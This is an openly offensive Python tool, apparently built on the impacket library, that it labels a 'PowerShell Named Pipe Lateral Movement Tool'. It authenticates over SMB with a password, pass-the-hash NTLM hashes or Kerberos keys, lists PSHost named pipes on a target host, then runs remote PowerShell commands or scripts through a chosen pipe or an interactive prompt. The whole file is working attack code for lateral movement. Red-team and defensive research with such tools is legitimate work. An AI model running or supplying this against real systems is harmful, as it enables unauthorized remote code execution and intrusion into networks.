#!/usr/bin/env python3
from __future__ import annotations

import argparse
import os
import sys
import time
from charset_normalizer import from_path

from pspipe.transport import AuthConfig, PipeConn
from pspipe.session import PSRPSession, set_debug
from impacket.examples.utils import parse_target


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="PowerShell Named Pipe Lateral Movement Tool")
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    
    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                       '(KRB5CCNAME) based on target parameters. If valid credentials '
                                                       'cannot be found, it will use the ones specified in the command '
                                                       'line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
    group = parser.add_argument_group('connection')
    
    group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in '
                            'the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')

    group = parser.add_argument_group('PowerShell Pipes')
    group.add_argument("--list", action="store_true", help="list PSHost pipes and exit")
    group.add_argument("--pipe", default="", help="full pipe name under IPC$ to connect to")
    group.add_argument("--command", default="", help="run one command and exit (non-interactive)")
    group.add_argument("--script", default="", help="run entire PS1 file")
 
    return parser


def main(argv=None) -> int:
    args = build_parser().parse_args(argv)
    print()
    if args.debug:
        set_debug(True)
        import logging
        logging.basicConfig(
            level=logging.DEBUG,
            format="%(asctime)s [impacket] %(levelname)s %(message)s",
            stream=sys.stderr,
        )
        # impacket logs under the root logger; make sure it isn't filtered.
        logging.getLogger("impacket").setLevel(logging.DEBUG)

    domain, username, password, address = parse_target(args.target)

    if domain is None:
        domain = ''
    
    if password == '' and username != '' and args.hashes is None and args.no_pass is False and args.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")
    if args.hashes is not None:
        lmhash, nthash = args.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''


    cfg = AuthConfig(
        host=address,
        username=username,
        password=password,
        domain=domain,
        port=args.port,
        use_kerberos=args.k,
        aes_key=args.aesKey,
        kdc_host=args.dc_ip,
        nthash=nthash,
        lmhash=lmhash
    )

    conn = PipeConn(cfg)
    try:
        conn.connect()
    except Exception as exc:  # noqa: BLE001
        print(f"[!] SMB connect/auth failed: {exc}", file=sys.stderr)
        return 1

    try:
        if args.list:
            try:
                names = conn.list_pipes("PSHost")
            except Exception as exc:  # noqa: BLE001
                print(f"[!] listing IPC$ failed (may be restricted): {exc}", file=sys.stderr)
                return 1
            if not names:
                print("No PSHost pipes visible (none running, or listing restricted).")
                return 0
            print("PSHost pipes on target:")
            for n in names:
                print("  ", n)
            return 0

        if not args.pipe:
            print("[!] --pipe is required unless --list is used", file=sys.stderr)
            return 2

        try:
            conn.open_pipe(args.pipe)
        except Exception as exc:  # noqa: BLE001
            # Layer 2: an access-denied here means the pipe DACL didn't grant
            # your account access. That's expected and not worked around.
            print(f"[!] opening pipe failed: {exc}", file=sys.stderr)
            return 1

        session = PSRPSession(conn)
        session.open()

        if args.script:
            scriptcontent = from_path(args.script).best()
            contents = str(scriptcontent)
            session.run_command(contents, wait=True)
            #time.sleep(5)
            #session.close()
            return 0
        if args.command:
            session.run_command(args.command, wait=True)
            #time.sleep(0.3)
            #session.close()
            return 0

        #'''INTERACTIVE DOESNT WORK YET
        print("Connected. Enter PowerShell commands; 'exit' to quit.")
        try:
            while True:
                try:
                    line = input("PS> ").strip()
                except EOFError:
                    break
                if line in ("exit", "quit"):
                    break
                if line:
                    session.run_command(line, wait=True)
        finally:
            session.close()#'''
        return 0
    finally:
        conn.close()


if __name__ == "__main__":
    raise SystemExit(main())
